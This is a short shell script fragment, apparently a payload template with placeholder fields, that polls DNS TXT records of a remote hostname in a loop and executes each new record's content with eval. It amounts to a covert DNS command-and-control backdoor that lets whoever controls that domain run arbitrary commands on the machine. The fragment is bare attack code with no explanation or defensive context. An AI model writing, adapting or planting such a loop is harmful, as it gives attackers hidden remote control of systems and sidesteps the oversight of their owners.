while [ "$e" != "1" ]
do
	m=$(nslookup -type=txt %q%.%hostname%|awk -F\" {print\$2});
	if [ "$m" != "$n" ]&&[ ${#m} -gt 1 ]; then
		n=$m;
		eval ${m//\\;/;}
	fi
done